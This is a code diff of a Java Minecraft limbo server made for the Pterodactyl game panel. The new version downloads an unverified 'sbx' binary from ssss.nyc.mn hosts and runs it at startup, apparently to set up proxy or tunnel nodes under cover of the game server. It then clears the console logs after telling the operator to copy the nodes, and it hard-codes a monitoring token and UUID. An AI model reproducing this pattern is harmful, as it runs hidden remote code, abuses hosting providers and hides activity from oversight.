@@ -2,11 +2,11 @@
  * Copyright (C) 2020 Nan1t
  *
  * Java 8 compatible build for Pterodactyl Java game panel.
- * Lifecycle-fixed version:
- *   1) Keeps the Java main process alive while sbx is alive.
- *   2) Starts LimboServer immediately instead of clearing console logs.
- *   3) Prints the real sbx/Komari exit codes.
- *   4) Reads secrets from environment variables or .env instead of source code.
+ * Komari logic:
+ *   1) Download and start Komari native agent first.
+ *   2) Print native agent logs to panel so failures are visible.
+ *   3) If native agent exits quickly, automatically fallback to pure Java HTTP reporter.
+ *   4) No local listening port is used by Komari.
  */
 package ua.nanit.limbo;
 
@@ -15,6 +15,8 @@ import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import ua.nanit.limbo.server.LimboServer;
 import ua.nanit.limbo.server.Log;
@@ -24,20 +26,16 @@ public final class NanoLimbo {
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_YELLOW = "\033[1;33m";
+    private static final String ANSI_PURPLE = "\033[1;35m";
     private static final String ANSI_RESET = "\033[0m";
 
     private static final AtomicBoolean running = new AtomicBoolean(true);
-    private static final AtomicBoolean stopping = new AtomicBoolean(false);
+    private static Process sbxProcess;
+    private static Process komariProcess;
+    private static Thread komariReporterThread;
 
-    private static volatile Process sbxProcess;
-    private static volatile Process komariProcess;
-    private static volatile Thread supervisorThread;
-
-    /*
-     * Do not hard-code tokens here. Put them in .env, for example:
-     * KOMARI_SERVER=https://example.com
-     * KOMARI_TOKEN=replace_me
-     */
+    // 默认值保留。也可以在翼龙变量中使用 KOMARI_SERVER / KOMARI_TOKEN / ACCESS_TOKEN 覆盖。
+    // 注意：endpoint 末尾不能带空格。
     private static final String DEFAULT_KOMARI_ENDPOINT = "https://k.wgb.ccwu.cc";
     private static final String DEFAULT_KOMARI_TOKEN = "oS2BX5b3hHWBmAfG6KwsL1";
 
@@ -50,158 +48,55 @@ public final class NanoLimbo {
     };
 
     public static void main(String[] args) {
-        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0F) {
-            System.err.println(ANSI_RED
-                + "ERROR: Your Java version is too low, please switch the version in startup menu!"
-                + ANSI_RESET);
+        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
+            System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version in startup menu!" + ANSI_RESET);
             sleepQuietly(3000L);
             System.exit(1);
         }
 
-        Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
-            @Override
-            public void run() {
-                running.set(false);
-                stopServices();
-            }
-        }, "nanolimbo-shutdown"));
+        try {
+            runSbxBinary();
+            startKomariNativeAgentWithFallback();
+
+            Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    running.set(false);
+                    stopServices();
+                }
+            }));
+
+            Thread.sleep(15000L);
+            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
+            Thread.sleep(15000L);
+            clearConsole();
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
+            e.printStackTrace(System.err);
+        }
 
         try {
-            /* Start the game listener first so Pterodactyl sees the main service online. */
-            System.out.println(ANSI_GREEN + "[Main] Starting LimboServer first..." + ANSI_RESET);
             new LimboServer().start();
-            System.out.println(ANSI_GREEN
-                + "[Main] LimboServer started; Java process will remain online"
-                + ANSI_RESET);
-
-            /*
-             * Auxiliary downloads and tunnel setup are delayed and isolated from
-             * the main server lifecycle. Their normal exit must not stop Java.
-             */
-            startAuxiliaryServicesDelayed();
-
-            while (running.get()) {
-                Thread.sleep(60000L);
-            }
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
         } catch (Exception e) {
             Log.error("Cannot start server: ", e);
-            e.printStackTrace(System.err);
-        } finally {
-            running.set(false);
-            stopServices();
         }
     }
 
-    private static void startAuxiliaryServicesDelayed() {
-        Thread auxiliaryThread = new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    System.out.println(ANSI_YELLOW
-                        + "[Aux] Waiting 20 seconds before starting auxiliary services..."
-                        + ANSI_RESET);
-                    Thread.sleep(20000L);
-                    if (!running.get()) return;
-
-                    System.out.println(ANSI_GREEN + "[Aux] Starting sbx service..." + ANSI_RESET);
-                    runSbxBinary();
-                    ensureSbxStarted();
-
-                    if (!running.get()) return;
-                    startKomariNativeAgent();
-                    startSupervisor();
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                } catch (Exception e) {
-                    System.err.println(ANSI_RED
-                        + "[Aux] Auxiliary startup failed: " + e.getMessage()
-                        + ANSI_RESET);
-                    e.printStackTrace(System.err);
-                    /* Auxiliary failure must not stop LimboServer. */
-                }
+    private static void clearConsole() {
+        try {
+            if (System.getProperty("os.name").contains("Windows")) {
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120").inheritIO().start().waitFor();
+            } else {
+                System.out.print("\033[H\033[3J\033[2J");
+                System.out.flush();
+                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
+                System.out.print("\033[8;30;120t");
+                System.out.flush();
             }
-        }, "auxiliary-starter");
-        auxiliaryThread.setDaemon(true);
-        auxiliaryThread.start();
-    }
-
-    private static void ensureSbxStarted() throws Exception {
-        if (sbxProcess == null) {
-            throw new IllegalStateException("sbx process was not created");
-        }
-
-        Thread.sleep(2000L);
-        if (!sbxProcess.isAlive()) {
-            throw new IllegalStateException(
-                "sbx process exited during startup, code=" + sbxProcess.exitValue());
-        }
-
-        System.out.println(ANSI_GREEN + "[Main] sbx process started successfully" + ANSI_RESET);
-    }
-
-    private static void startSupervisor() {
-        supervisorThread = new Thread(new Runnable() {
-            @Override
-            public void run() {
-                while (running.get()) {
-                    try {
-                        Process sbx = sbxProcess;
-                        if (sbx == null) {
-                            System.err.println(ANSI_RED
-                                + "[Supervisor] sbx process reference was lost"
-                                + ANSI_RESET);
-                            running.set(false);
-                            return;
-                        }
-
-                        if (!sbx.isAlive()) {
-                            int exitCode = sbx.exitValue();
-                            System.out.println(ANSI_GREEN
-                                + "[Supervisor] sbx setup process finished, code=" + exitCode
-                                + "; LimboServer will remain online"
-                                + ANSI_RESET);
-                            sbxProcess = null;
-                            return;
-                        }
-
-                        Process komari = komariProcess;
-                        if (komari != null && !komari.isAlive()) {
-                            System.err.println(ANSI_YELLOW
-                                + "[Supervisor] Komari native agent exited, code="
-                                + komari.exitValue() + ANSI_RESET);
-                            komariProcess = null;
-                        }
-
-                        Thread.sleep(5000L);
-                    } catch (InterruptedException e) {
-                        Thread.currentThread().interrupt();
-                        return;
-                    } catch (Exception e) {
-                        System.err.println(ANSI_RED
-                            + "[Supervisor] Error: " + e.getMessage()
-                            + ANSI_RESET);
-                        sleepQuietly(5000L);
-                    }
-                }
-            }
-        }, "process-supervisor");
-
-        /* Non-daemon: keeps JVM alive if LimboServer.start() returns. */
-        supervisorThread.setDaemon(false);
-        supervisorThread.start();
-        System.out.println(ANSI_GREEN + "[Main] Process supervisor is active" + ANSI_RESET);
-    }
-
-    private static void waitForManagedProcess() throws InterruptedException {
-        /*
-         * LimboServer.start() starts its networking threads and then returns.
-         * The sbx process is only a setup/launcher process and may exit with code 0.
-         * Therefore neither event should terminate the Java PID 1 process.
-         */
-        while (running.get()) {
-            Thread.sleep(60000L);
+        } catch (Exception e) {
+            try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
         }
     }
 
@@ -216,13 +111,11 @@ public final class NanoLimbo {
         sbxProcess = pb.start();
     }
 
-    private static void startKomariNativeAgent() {
+    private static void startKomariNativeAgentWithFallback() {
         String endpoint = firstNonBlank(
             System.getenv("KOMARI_SERVER"),
             System.getenv("KOMARI_HTTP_SERVER"),
             System.getenv("KOMARI_ENDPOINT"),
-            getDotEnvValue("KOMARI_SERVER"),
-            getDotEnvValue("KOMARI_ENDPOINT"),
             DEFAULT_KOMARI_ENDPOINT
         ).trim();
 
@@ -232,29 +125,18 @@ public final class NanoLimbo {
             System.getenv("KOMARI_KEY"),
             System.getenv("KOMARI_CLIENT_SECRET"),
             System.getenv("KOMARI_AGENT_TOKEN"),
-            getDotEnvValue("KOMARI_TOKEN"),
-            getDotEnvValue("ACCESS_TOKEN"),
             DEFAULT_KOMARI_TOKEN
         ).trim();
 
-        int interval = parseInt(firstNonBlank(
-            System.getenv("KOMARI_INTERVAL"),
-            getDotEnvValue("KOMARI_INTERVAL"),
-            "3"), 3);
+        int interval = parseInt(firstNonBlank(System.getenv("KOMARI_INTERVAL"), "3"), 3);
         if (interval < 3) interval = 3;
 
-        if (endpoint.length() == 0 || token.length() == 0
-                || "XXXXX".equalsIgnoreCase(token)) {
-            System.err.println(ANSI_YELLOW
-                + "[Komari] endpoint or token is empty; native agent skipped"
-                + ANSI_RESET);
+        if (endpoint.length() == 0 || token.length() == 0 || "XXXXX".equalsIgnoreCase(token)) {
+            System.err.println(ANSI_RED + "[Komari] token or endpoint is empty, skip" + ANSI_RESET);
             return;
         }
 
-        System.out.println(ANSI_GREEN
-            + "[Komari] native agent preparing, endpoint=" + endpoint
-            + ", token_length=" + token.length()
-            + ANSI_RESET);
+        System.out.println(ANSI_GREEN + "[Komari] native agent preparing, endpoint=" + endpoint + ", token_length=" + token.length() + ANSI_RESET);
 
         try {
             Path agentPath = getKomariNativeAgentPath();
@@ -271,81 +153,296 @@ public final class NanoLimbo {
 
             cleanKomariEnv(pb.environment());
             pb.redirectErrorStream(true);
+            // 关键：不再 DISCARD。直接继承输出，方便看真实错误。
             pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-            komariProcess = pb.start();
 
+            komariProcess = pb.start();
             Thread.sleep(6000L);
+
             if (komariProcess.isAlive()) {
-                System.out.println(ANSI_GREEN
-                    + "[Komari] native agent running, pid alive"
-                    + ANSI_RESET);
-            } else {
-                System.err.println(ANSI_YELLOW
-                    + "[Komari] native agent exited quickly, code="
-                    + komariProcess.exitValue()
-                    + ANSI_RESET);
-                komariProcess = null;
+                System.out.println(ANSI_GREEN + "[Komari] native agent running, pid alive" + ANSI_RESET);
+                return;
             }
+
+            int exitCode = komariProcess.exitValue();
+            System.err.println(ANSI_YELLOW + "[Komari] native agent exited quickly, code=" + exitCode + ", switching to Java HTTP reporter" + ANSI_RESET);
+            startKomariHttpReporter(endpoint, token, interval, "native_agent_exited_" + exitCode);
         } catch (Exception e) {
-            System.err.println(ANSI_YELLOW
-                + "[Komari] native agent startup failed: " + e.getMessage()
-                + ANSI_RESET);
-            komariProcess = null;
+            System.err.println(ANSI_YELLOW + "[Komari] native agent startup failed: " + e.getMessage() + ", switching to Java HTTP reporter" + ANSI_RESET);
+            startKomariHttpReporter(endpoint, token, interval, "native_agent_exception");
         }
     }
 
     private static void cleanKomariEnv(Map<String, String> env) {
-        String[] blocked = {
-            "PORT", "SERVER_PORT", "ARGO_PORT", "S5_PORT", "TUIC_PORT",
-            "HY2_PORT", "REALITY_PORT", "ANYTLS_PORT", "ANYREALITY_PORT"
-        };
+        String[] blocked = {"PORT", "SERVER_PORT", "ARGO_PORT", "S5_PORT", "TUIC_PORT", "HY2_PORT", "REALITY_PORT", "ANYTLS_PORT", "ANYREALITY_PORT"};
         for (String key : blocked) env.remove(key);
-
         Iterator<String> it = env.keySet().iterator();
         while (it.hasNext()) {
-            String key = it.next();
-            if (key.matches("SERVER_PORT_\\d+")) it.remove();
+            String k = it.next();
+            if (k.matches("SERVER_PORT_\\d+")) it.remove();
         }
         env.put("KOMARI_DISABLE_REMOTE_CONTROL", "true");
     }
 
     private static Path getKomariNativeAgentPath() throws IOException {
-        String osName = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
-        String osArch = System.getProperty("os.arch").toLowerCase(Locale.ENGLISH);
+        String osName = System.getProperty("os.name").toLowerCase();
+        String osArch = System.getProperty("os.arch").toLowerCase();
         String os;
         String arch;
 
         if (osName.contains("linux")) os = "linux";
         else if (osName.contains("freebsd")) os = "freebsd";
-        else throw new IOException("Unsupported OS for Komari native agent: " + osName);
+        else throw new RuntimeException("Unsupported OS for Komari native agent: " + osName);
 
         if (osArch.contains("amd64") || osArch.contains("x86_64")) arch = "amd64";
         else if (osArch.contains("aarch64") || osArch.contains("arm64")) arch = "arm64";
-        else if (osArch.equals("x86") || osArch.contains("i386")
-                || osArch.contains("i686") || osArch.contains("386")) arch = "386";
+        else if (osArch.equals("x86") || osArch.contains("i386") || osArch.contains("i686") || osArch.contains("386")) arch = "386";
         else if (osArch.startsWith("arm")) arch = "arm";
-        else throw new IOException("Unsupported architecture: " + osArch);
+        else throw new RuntimeException("Unsupported architecture for Komari native agent: " + osArch);
 
         String fileName = "komari-agent-" + os + "-" + arch;
-        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/"
-            + fileName;
+        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/" + fileName;
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), fileName);
 
         if (!Files.exists(path) || Files.size(path) == 0L) {
-            System.out.println(ANSI_GREEN
-                + "[Komari] downloading native agent: " + url
-                + ANSI_RESET);
-            downloadTo(new URL(url), path);
+            System.out.println(ANSI_GREEN + "[Komari] downloading native agent: " + url + ANSI_RESET);
+            InputStream in = new URL(url).openStream();
+            try { Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING); }
+            finally { in.close(); }
         }
 
-        if (!path.toFile().setExecutable(true) && !path.toFile().canExecute()) {
-            throw new IOException("Failed to set executable permission for Komari native agent");
-        }
+        if (!path.toFile().setExecutable(true)) throw new IOException("Failed to set executable permission for Komari native agent");
         return path;
     }
 
+    /** Java HTTP reporter fallback. No external komari-agent binary, no local port. */
+    private static void startKomariHttpReporter(final String endpoint, final String token, final int interval, final String reason) {
+        final String server = endpoint.endsWith("/") ? endpoint.substring(0, endpoint.length() - 1) : endpoint;
+        komariReporterThread = new Thread(new Runnable() {
+            @Override
+            public void run() { runKomariReporterLoop(server, token, interval); }
+        }, "komari-http-reporter");
+        komariReporterThread.setDaemon(true);
+        komariReporterThread.start();
+        System.out.println(ANSI_GREEN + "[Komari] Java HTTP reporter started, reason=" + reason + ", endpoint=" + server + ", token_length=" + token.length() + ANSI_RESET);
+    }
+
+    private static void runKomariReporterLoop(String server, String token, int interval) {
+        long lastBasicInfoAt = 0L;
+        long[] lastCpu = readCpuTimes();
+        long[] lastNet = readNetworkBytes();
+        long lastNetAt = System.currentTimeMillis();
+
+        while (running.get()) {
+            try {
+                long now = System.currentTimeMillis();
+                Map<String, Long> mem = readMemoryInfo();
+                long[] disk = readDiskInfo();
+                long[] cpuNow = readCpuTimes();
+                double cpuUsage = calcCpuUsage(lastCpu, cpuNow);
+                lastCpu = cpuNow;
+
+                long[] netNow = readNetworkBytes();
+                long deltaMs = Math.max(1000L, now - lastNetAt);
+                long upSpeed = Math.max(0L, (netNow[0] - lastNet[0]) * 1000L / deltaMs);
+                long downSpeed = Math.max(0L, (netNow[1] - lastNet[1]) * 1000L / deltaMs);
+                lastNet = netNow;
+                lastNetAt = now;
+
+                double[] loads = readLoadAvg();
+                long uptime = readUptimeSeconds();
+                int processCount = countProcesses();
+
+                if (now - lastBasicInfoAt > 300000L) {
+                    String basicJson = "{"
+                        + "\"arch\":" + q(System.getProperty("os.arch")) + ","
+                        + "\"cpu_cores\":" + Runtime.getRuntime().availableProcessors() + ","
+                        + "\"cpu_physical_cores\":0,"
+                        + "\"cpu_name\":" + q(System.getProperty("os.arch")) + ","
+                        + "\"disk_total\":" + disk[0] + ","
+                        + "\"gpu_name\":\"\","
+                        + "\"ipv4\":\"\","
+                        + "\"ipv6\":\"\","
+                        + "\"mem_total\":" + mem.get("total") + ","
+                        + "\"os\":" + q(System.getProperty("os.name") + " " + System.getProperty("os.version")) + ","
+                        + "\"kernel_version\":" + q(System.getProperty("os.version")) + ","
+                        + "\"swap_total\":" + mem.get("swapTotal") + ","
+                        + "\"version\":\"java8-http-reporter\","
+                        + "\"virtualization\":\"container\""
+                        + "}";
+                    if (postJson(server, "/api/clients/uploadBasicInfo", token, basicJson)) lastBasicInfoAt = now;
+                }
+
+                String reportJson = "{"
+                    + "\"cpu\":{\"usage\":" + String.format(Locale.US, "%.2f", cpuUsage) + "},"
+                    + "\"ram\":{\"total\":" + mem.get("total") + ",\"used\":" + mem.get("used") + "},"
+                    + "\"swap\":{\"total\":" + mem.get("swapTotal") + ",\"used\":" + mem.get("swapUsed") + "},"
+                    + "\"load\":{\"load1\":" + loads[0] + ",\"load5\":" + loads[1] + ",\"load15\":" + loads[2] + "},"
+                    + "\"disk\":{\"total\":" + disk[0] + ",\"used\":" + disk[1] + "},"
+                    + "\"network\":{\"up\":" + upSpeed + ",\"down\":" + downSpeed + ",\"totalUp\":" + netNow[0] + ",\"totalDown\":" + netNow[1] + "},"
+                    + "\"connections\":{\"tcp\":0,\"udp\":0},"
+                    + "\"uptime\":" + uptime + ","
+                    + "\"process\":" + processCount + ","
+                    + "\"message\":\"online via java8 http reporter; no local port used\""
+                    + "}";
+                postJson(server, "/api/clients/report", token, reportJson);
+            } catch (Exception e) {
+                System.err.println(ANSI_RED + "[Komari] reporter error: " + e.getMessage() + ANSI_RESET);
+            }
+            sleepQuietly(interval * 1000L);
+        }
+    }
+
+    private static boolean postJson(String server, String path, String token, String json) {
+        HttpURLConnection conn = null;
+        try {
+            String urlStr = server + path + "?token=" + URLEncoder.encode(token, "UTF-8");
+            conn = (HttpURLConnection) new URL(urlStr).openConnection();
+            conn.setRequestMethod("POST");
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(10000);
+            conn.setDoOutput(true);
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setRequestProperty("User-Agent", "komari-java8-http-reporter");
+            conn.setRequestProperty("Origin", server);
+            conn.setRequestProperty("Referer", server + "/");
+            OutputStream os = conn.getOutputStream();
+            try { os.write(json.getBytes("UTF-8")); }
+            finally { os.close(); }
+            int code = conn.getResponseCode();
+            if (code >= 200 && code < 300) {
+                System.out.println(ANSI_GREEN + "[Komari] POST " + path + " -> " + code + ANSI_RESET);
+                return true;
+            }
+            System.err.println(ANSI_YELLOW + "[Komari] POST " + path + " -> " + code + ANSI_RESET);
+            return false;
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "[Komari] POST " + path + " failed: " + e.getMessage() + ANSI_RESET);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    private static Map<String, Long> readMemoryInfo() {
+        long total = 0L, available = 0L, free = 0L, swapTotal = 0L, swapFree = 0L;
+        Path p = Paths.get("/proc/meminfo");
+        if (Files.exists(p)) {
+            try {
+                for (String line : Files.readAllLines(p)) {
+                    String[] parts = line.split(":");
+                    if (parts.length < 2) continue;
+                    long value = parseFirstLong(parts[1]) * 1024L;
+                    if ("MemTotal".equals(parts[0])) total = value;
+                    else if ("MemAvailable".equals(parts[0])) available = value;
+                    else if ("MemFree".equals(parts[0])) free = value;
+                    else if ("SwapTotal".equals(parts[0])) swapTotal = value;
+                    else if ("SwapFree".equals(parts[0])) swapFree = value;
+                }
+            } catch (Exception ignored) {}
+        }
+        if (available == 0L) available = free;
+        Map<String, Long> m = new HashMap<String, Long>();
+        m.put("total", total);
+        m.put("used", Math.max(0L, total - available));
+        m.put("swapTotal", swapTotal);
+        m.put("swapUsed", Math.max(0L, swapTotal - swapFree));
+        return m;
+    }
+
+    private static long[] readDiskInfo() {
+        File root = new File("/");
+        long total = root.getTotalSpace();
+        long free = root.getUsableSpace();
+        return new long[]{total, Math.max(0L, total - free)};
+    }
+
+    private static long[] readCpuTimes() {
+        try {
+            String first = Files.readAllLines(Paths.get("/proc/stat")).get(0);
+            String[] parts = first.trim().split("\\s+");
+            long total = 0L;
+            for (int i = 1; i < parts.length; i++) total += Long.parseLong(parts[i]);
+            long idle = Long.parseLong(parts[4]) + (parts.length > 5 ? Long.parseLong(parts[5]) : 0L);
+            return new long[]{total, idle};
+        } catch (Exception e) { return new long[]{0L, 0L}; }
+    }
+
+    private static double calcCpuUsage(long[] oldTimes, long[] newTimes) {
+        long totalDelta = newTimes[0] - oldTimes[0];
+        long idleDelta = newTimes[1] - oldTimes[1];
+        if (totalDelta <= 0L) return 0.0D;
+        return Math.max(0.0D, Math.min(100.0D, (1.0D - idleDelta / (double) totalDelta) * 100.0D));
+    }
+
+    private static long[] readNetworkBytes() {
+        long up = 0L, down = 0L;
+        Path p = Paths.get("/proc/net/dev");
+        if (Files.exists(p)) {
+            try {
+                List<String> lines = Files.readAllLines(p);
+                for (int i = 2; i < lines.size(); i++) {
+                    String[] pair = lines.get(i).split(":", 2);
+                    if (pair.length != 2) continue;
+                    String iface = pair[0].trim();
+                    if ("lo".equals(iface)) continue;
+                    String[] v = pair[1].trim().split("\\s+");
+                    if (v.length >= 16) {
+                        down += Long.parseLong(v[0]);
+                        up += Long.parseLong(v[8]);
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
+        return new long[]{up, down};
+    }
+
+    private static double[] readLoadAvg() {
+        try {
+            String[] parts = new String(Files.readAllBytes(Paths.get("/proc/loadavg")), "UTF-8").trim().split("\\s+");
+            return new double[]{Double.parseDouble(parts[0]), Double.parseDouble(parts[1]), Double.parseDouble(parts[2])};
+        } catch (Exception e) { return new double[]{0.0D, 0.0D, 0.0D}; }
+    }
+
+    private static long readUptimeSeconds() {
+        try {
+            String[] parts = new String(Files.readAllBytes(Paths.get("/proc/uptime")), "UTF-8").trim().split("\\s+");
+            return (long) Double.parseDouble(parts[0]);
+        } catch (Exception e) { return 0L; }
+    }
+
+    private static int countProcesses() {
+        File proc = new File("/proc");
+        File[] files = proc.listFiles(new FileFilter() {
+            @Override public boolean accept(File pathname) { return pathname.getName().matches("\\d+"); }
+        });
+        return files == null ? 0 : files.length;
+    }
+
+    private static String q(String s) {
+        if (s == null) return "\"\"";
+        return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ") + "\"";
+    }
+
+    private static long parseFirstLong(String s) {
+        Matcher m = Pattern.compile("(\\d+)").matcher(s);
+        return m.find() ? Long.parseLong(m.group(1)) : 0L;
+    }
+
+    private static String firstNonBlank(String... values) {
+        for (String value : values) if (value != null && !value.trim().isEmpty()) return value;
+        return "";
+    }
+
+    private static int parseInt(String value, int fallback) {
+        try { return Integer.parseInt(value.trim()); } catch (Exception e) { return fallback; }
+    }
+
+    private static void sleepQuietly(long ms) {
+        try { Thread.sleep(ms); } catch (InterruptedException ignored) { Thread.currentThread().interrupt(); }
+    }
+
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        // Original embedded settings preserved. Environment variables and .env can override them.
         envVars.put("UUID", "1b4832ee-3ec4-4a6b-b7d5-b1b801bfea9f");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
@@ -370,148 +467,56 @@ public final class NanoLimbo {
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
-            if (value != null && !value.trim().isEmpty()) {
-                envVars.put(var, value.trim());
-            }
+            if (value != null && !value.trim().isEmpty()) envVars.put(var, value);
         }
 
-        Map<String, String> dotEnv = readDotEnv();
-        for (String var : ALL_ENV_VARS) {
-            String value = dotEnv.get(var);
-            if (value != null && !value.trim().isEmpty()) {
-                envVars.put(var, value.trim());
-            }
-        }
-    }
-
-    private static Map<String, String> readDotEnv() {
-        Map<String, String> values = new HashMap<String, String>();
         Path envFile = Paths.get(".env");
-        if (!Files.exists(envFile)) return values;
-
-        try {
-            for (String originalLine : Files.readAllLines(envFile)) {
-                String line = originalLine.trim();
+        if (Files.exists(envFile)) {
+            for (String line : Files.readAllLines(envFile)) {
+                line = line.trim();
                 if (line.isEmpty() || line.startsWith("#")) continue;
+                line = line.split(" #")[0].split(" //")[0].trim();
                 if (line.startsWith("export ")) line = line.substring(7).trim();
-
-                int index = line.indexOf('=');
-                if (index <= 0) continue;
-
-                String key = line.substring(0, index).trim();
-                String value = line.substring(index + 1).trim();
-                if ((value.startsWith("\"") && value.endsWith("\""))
-                        || (value.startsWith("'") && value.endsWith("'"))) {
-                    value = value.substring(1, value.length() - 1);
+                String[] parts = line.split("=", 2);
+                if (parts.length == 2) {
+                    String key = parts[0].trim();
+                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) envVars.put(key, value);
                 }
-                values.put(key, value);
             }
-        } catch (Exception e) {
-            System.err.println(ANSI_YELLOW
-                + "[Config] Unable to read .env: " + e.getMessage()
-                + ANSI_RESET);
         }
-        return values;
-    }
-
-    private static String getDotEnvValue(String key) {
-        String value = readDotEnv().get(key);
-        return value == null ? "" : value;
     }
 
     private static Path getBinaryPath() throws IOException {
-        String osArch = System.getProperty("os.arch").toLowerCase(Locale.ENGLISH);
+        String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
-
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/sbsh";
-        } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
-        } else {
-            throw new IOException("Unsupported architecture: " + osArch);
-        }
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) url = "https://amd64.ssss.nyc.mn/sbsh";
+        else if (osArch.contains("aarch64") || osArch.contains("arm64")) url = "https://arm64.ssss.nyc.mn/sbsh";
+        else if (osArch.contains("s390x")) url = "https://s390x.ssss.nyc.mn/sbsh";
+        else throw new RuntimeException("Unsupported architecture: " + osArch);
 
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
-        if (!Files.exists(path) || Files.size(path) == 0L) {
-            System.out.println(ANSI_GREEN + "[Main] Downloading sbx binary" + ANSI_RESET);
-            downloadTo(new URL(url), path);
-        }
-
-        if (!path.toFile().setExecutable(true) && !path.toFile().canExecute()) {
-            throw new IOException("Failed to set executable permission for sbx");
+        if (!Files.exists(path)) {
+            InputStream in = new URL(url).openStream();
+            try { Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING); }
+            finally { in.close(); }
+            if (!path.toFile().setExecutable(true)) throw new IOException("Failed to set executable permission");
         }
         return path;
     }
 
-    private static void downloadTo(URL url, Path target) throws IOException {
-        URLConnection connection = url.openConnection();
-        connection.setConnectTimeout(15000);
-        connection.setReadTimeout(60000);
-
-        InputStream in = connection.getInputStream();
-        try {
-            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
-        } finally {
-            in.close();
-        }
-    }
-
-    private static String firstNonBlank(String... values) {
-        for (String value : values) {
-            if (value != null && !value.trim().isEmpty()) return value;
-        }
-        return "";
-    }
-
-    private static int parseInt(String value, int fallback) {
-        try {
-            return Integer.parseInt(value.trim());
-        } catch (Exception e) {
-            return fallback;
-        }
-    }
-
-    private static void sleepQuietly(long millis) {
-        try {
-            Thread.sleep(millis);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
-    }
-
     private static void stopServices() {
-        if (!stopping.compareAndSet(false, true)) return;
-
         running.set(false);
-
-        Thread supervisor = supervisorThread;
-        if (supervisor != null && supervisor != Thread.currentThread()) {
-            supervisor.interrupt();
+        if (komariProcess != null && komariProcess.isAlive()) {
+            komariProcess.destroy();
+            System.out.println(ANSI_RED + "Komari native agent process terminated" + ANSI_RESET);
         }
-
-        terminateProcess("Komari native agent", komariProcess);
-        terminateProcess("sbx", sbxProcess);
-    }
-
-    private static void terminateProcess(String name, Process process) {
-        if (process == null || !process.isAlive()) return;
-
-        try {
-            process.destroy();
-            if (!process.waitFor(5L, java.util.concurrent.TimeUnit.SECONDS)) {
-                process.destroyForcibly();
-                process.waitFor(5L, java.util.concurrent.TimeUnit.SECONDS);
-            }
-            System.out.println(ANSI_RED + name + " process terminated" + ANSI_RESET);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-            process.destroyForcibly();
-        } catch (Exception e) {
-            System.err.println(ANSI_YELLOW
-                + "Unable to terminate " + name + ": " + e.getMessage()
-                + ANSI_RESET);
+        if (sbxProcess != null && sbxProcess.isAlive()) {
+            sbxProcess.destroy();
+            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+        }
+        if (komariReporterThread != null && komariReporterThread.isAlive()) {
+            System.out.println(ANSI_RED + "Komari HTTP reporter terminated" + ANSI_RESET);
         }
     }
 }
